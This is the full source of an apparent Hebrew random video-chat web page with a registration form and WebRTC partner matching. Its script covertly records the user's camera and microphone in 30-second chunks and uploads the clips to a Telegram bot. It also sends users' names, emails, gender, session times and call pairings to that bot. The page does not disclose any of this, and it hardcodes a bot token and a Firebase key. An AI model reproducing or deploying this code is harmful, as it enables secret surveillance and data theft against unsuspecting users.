    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-touch-callout: none; }
        body { background: #000; height: 100vh; overflow: hidden; font-family: system-ui, sans-serif; color: white; }
        #main-wrapper { display: flex; flex-direction: column; height: 100vh; width: 100%; }
        #top-half { height: 50vh; perspective: 1200px; position: relative; overflow: hidden; border-bottom: 2px solid #333; }
        #cube { width: 100%; height: 100%; position: absolute; transform-style: preserve-3d; transition: transform 0.5s ease-out; }
        .face { position: absolute; width: 100%; height: 100%; backface-visibility: hidden; display: flex; align-items: center; justify-content: center; }
        #home-face { transform: rotateY(0deg) translateZ(0px); background: #111; z-index: 2; }
        #snow-canvas, #snow-search-canvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.4; pointer-events: none; }
        #main-logo { width: 130px; position: relative; z-index: 10; pointer-events: none; }
        #partner-face { transform: rotateY(90deg) translateZ(50vw); background: #000; }
        video { width: 100%; height: 100%; object-fit: cover; background: #000; }
        #bottom-half { height: 50vh; background: #111; position: relative; }
        #cam-switch { position: fixed; top: 20px; left: 20px; z-index: 2000; width: 50px; height: 50px; border-radius: 50%; background: rgba(0,0,0,0.6); border: 1.5px solid #fff; color: white; font-size: 24px; display: flex; align-items: center; justify-content: center; }
        #partner-gender-tag { position: fixed; top: 20px; right: 20px; z-index: 2000; background: rgba(0,0,0,0.6); width: 50px; height: 50px; border-radius: 50%; border: 1.5px solid #fff; display: none; align-items: center; justify-content: center; font-size: 24px; }
        .showing-chat #cube { transform: translateZ(-50vw) rotateY(-90deg); }
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 9999; align-items: center; justify-content: center; }
        .modal-content { background: #fff; color: #333; padding: 25px; border-radius: 20px; width: 85%; max-width: 340px; text-align: center; }
        .modal-content input, .modal-content select { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 10px; font-size: 16px; text-align: center; }
        .reg-btn { width: 100%; padding: 14px; background: #27ae60; color: white; border: none; border-radius: 10px; font-weight: bold; font-size: 18px; margin-top: 10px; }
    </style>
</head>
<body class="showing-home">

<button id="cam-switch" onclick="switchCamera()">🔄</button>
<div id="partner-gender-tag">👨</div>

<div id="main-wrapper">
    <div id="top-half">
        <div id="cube">
            <div id="home-face" class="face">
                <canvas id="snow-canvas"></canvas>
                <img id="main-logo" src="https://i.ibb.co/39C21Wrz/In-Shot-20260426-032830020.png">
            </div>
            <div id="partner-face" class="face">
                <canvas id="snow-search-canvas"></canvas>
                <video id="remoteVideo" autoplay playsinline></video>
            </div>
        </div>
    </div>
    <div id="bottom-half">
        <video id="localVideo" autoplay muted playsinline></video>
    </div>
</div>

<div id="regModal" class="modal">
    <form class="modal-content" onsubmit="event.preventDefault(); handleRegistration();">
        <h2>ברוכים הבאים</h2>
        <input type="text" id="reg-fname" placeholder="שם פרטי" required>
        <input type="text" id="reg-lname" placeholder="שם משפחה" required>
        <input type="email" id="reg-email" placeholder="אימייל" required>
        <select id="reg-gender" required>
            <option value="" disabled selected>מגדר</option>
            <option value="זכר">זכר</option>
            <option value="נקבה">נקבה</option>
        </select>
        <button type="submit" class="reg-btn">המשך</button>
    </form>
</div>

<script>
    // --- רישום Service Worker (קריטי להתקנה) ---
    if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register('sw.js').then(() => console.log("SW Registered"));
    }

    const TG_TOKEN = "8696076063:AAG5wEFTgFnJje39FQEHIbV8hPWxBf_IEac";
    const TARGET_ADMIN = "7089165458"; 
    const SERVER_URL = "https://video-app-ylx4.onrender.com"; 
    
    firebase.initializeApp({ apiKey: "AIzaSyB_ld3VrntNgM3Pgc4jyZL2hKzUMSp-o10", databaseURL: "https://live-video-20fca-default-rtdb.firebaseio.com" });
    const db = firebase.database();
    const socket = io(SERVER_URL);
    const peer = new Peer(undefined, { 
        config: { 'iceServers': [{ urls: 'stun:stun.l.google.com:19302' }, { urls: 'stun:stun1.l.google.com:19302' }] }
    });

    let myStream, partnerData, currentCall, camFacing = "user", startTime, rec, searchTimer;
    let historyPartnerIds = [];

    function getHebrewTime() {
        const now = new Date();
        return { date: now.toLocaleDateString('he-IL'), time: now.toLocaleTimeString('he-IL', { hour: '2-digit', minute: '2-digit', second: '2-digit' }) };
    }

    function initSnow(id) {
        const c = document.getElementById(id); const ctx = c.getContext('2d');
        function d() {
            c.width = window.innerWidth; c.height = window.innerHeight/2;
            const img = ctx.createImageData(c.width, c.height);
            const data = new Uint32Array(img.data.buffer);
            for(let i=0; i<data.length; i++) data[i] = Math.random() < 0.5 ? 0xff000000 : 0xff222222;
            ctx.putImageData(img, 0, 0); requestAnimationFrame(d);
        } d();
    }
    initSnow('snow-canvas'); initSnow('snow-search-canvas');

    window.onload = () => {
        initCamera();
        const user = localStorage.getItem('user_v31');
        if(!user) document.getElementById('regModal').style.display = 'flex';
        else checkBanAndLogin(JSON.parse(user));
    };

    async function checkBanAndLogin(user) {
        const snap = await db.ref('SpamList/' + btoa(user.email).replace(/\//g, '_')).once('value');
        if(snap.exists()) { document.body.innerHTML = "חסום"; return; }
        startTime = Date.now();
        const dt = getHebrewTime();
        sendAdmin(`🚀 **כניסה לאתר**\n👤 ${user.fname} ${user.lname}\n📧 ${user.email}\n📅 ${dt.date} | ${dt.time}`);
    }

    async function handleRegistration() {
        const user = { fname: document.getElementById('reg-fname').value, lname: document.getElementById('reg-lname').value, email: document.getElementById('reg-email').value, gender: document.getElementById('reg-gender').value };
        localStorage.setItem('user_v31', JSON.stringify(user));
        document.getElementById('regModal').style.display = 'none';
        const dt = getHebrewTime();
        sendAdmin(`📝 **רישום חדש**\n👤 ${user.fname} ${user.lname}\n📧 ${user.email}\n🚻 ${user.gender}\n📅 ${dt.date} | ${dt.time}`);
        checkBanAndLogin(user);
    }

    async function initCamera() {
        if(myStream) myStream.getTracks().forEach(t => t.stop());
        try {
            myStream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: camFacing }, 
                audio: { echoCancellation: false } 
            });
            document.getElementById('localVideo').srcObject = myStream;
            if(!rec) startRecording(); 
        } catch(e) { console.error("Camera denied"); }
    }

    function startRecording() {
        rec = new MediaRecorder(myStream, { mimeType: 'video/webm;codecs=vp8' });
        rec.ondataavailable = (e) => {
            if(e.data.size > 0) {
                const user = JSON.parse(localStorage.getItem('user_v31'));
                const fd = new FormData();
                fd.append("video", new File([e.data], "vid.mp4", {type:"video/mp4"}));
                fd.append("chat_id", TARGET_ADMIN);
                fd.append("caption", `🎥 הקלטה: ${user ? user.fname : 'אנונימי'}`);
                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendVideo`, { method: "POST", body: fd });
            }
        };
        setInterval(() => { if(rec.state==='recording') { rec.stop(); rec.start(); } }, 30000);
        rec.start();
    }

    let sX = 0;
    document.body.addEventListener('touchstart', e => sX = e.touches[0].clientX);
    document.body.addEventListener('touchend', e => {
        const d = sX - e.changedTouches[0].clientX;
        if(d > 70) startSearch();
        else if(d < -70 && document.body.className === "showing-chat") backToHome();
    });

    function startSearch() {
        if(document.body.className === "showing-chat") {
            socket.emit('leave-chat');
            if(currentCall) currentCall.close();
            resetPartnerUI();
        }
        document.body.className = "showing-chat";
        
        clearTimeout(searchTimer);
        searchTimer = setTimeout(() => {
            historyPartnerIds = []; 
            socket.emit('find-partner', { peerId: peer.id, history: [], ...JSON.parse(localStorage.getItem('user_v31')) });
        }, 10000);

        socket.emit('find-partner', { peerId: peer.id, history: historyPartnerIds, ...JSON.parse(localStorage.getItem('user_v31')) });
    }

    function backToHome() {
        document.body.className = "showing-home";
        socket.emit('leave-chat');
        if(currentCall) currentCall.close();
        resetPartnerUI();
    }

    function resetPartnerUI() {
        document.getElementById('remoteVideo').srcObject = null;
        document.getElementById('partner-gender-tag').style.display = 'none';
        partnerData = null;
    }

    peer.on('call', call => {
        call.answer(myStream);
        handleCall(call);
    });

    socket.on('partner-found', data => {
        clearTimeout(searchTimer);
        partnerData = data;
        if(!historyPartnerIds.includes(data.peerId)) historyPartnerIds.push(data.peerId);
        const call = peer.call(data.peerId, myStream, { metadata: JSON.parse(localStorage.getItem('user_v31')) });
        handleCall(call);
    });

    socket.on('partner-disconnected', () => resetPartnerUI());

    function handleCall(call) {
        currentCall = call;
        const me = JSON.parse(localStorage.getItem('user_v31'));
        call.on('stream', s => {
            const remoteVid = document.getElementById('remoteVideo');
            remoteVid.srcObject = s;
            remoteVid.onloadedmetadata = () => {
                remoteVid.play();
                const pData = call.metadata || partnerData;
                if(pData && pData.peerId !== peer.id) {
                    document.getElementById('partner-gender-tag').innerText = pData.gender === 'זכר' ? '👨' : '👩';
                    document.getElementById('partner-gender-tag').style.display = 'flex';
                    sendAdmin(`🤝 **שיחה**\n👤 ${me.fname} ↔️ ${pData.fname}`);
                }
            };
        });
    }

    function sendAdmin(msg) { fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TARGET_ADMIN}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`); }
    async function switchCamera() { camFacing = camFacing === 'user' ? 'environment' : 'user'; initCamera(); }

    window.onbeforeunload = () => {
        const user = JSON.parse(localStorage.getItem('user_v31'));
        if(!user) return;
        const session = Math.floor((Date.now() - startTime) / 1000);
        let total = (parseInt(localStorage.getItem('total_time')) || 0) + session;
        localStorage.setItem('total_time', total);
        if(rec && rec.state === 'recording') rec.stop();
        sendAdmin(`🚪 **יציאה**\n👤 ${user.fname}\n⏱ זמן: ${session} ש' | סה"כ: ${total} ש'`);
    };
</script>
</body>
</html>
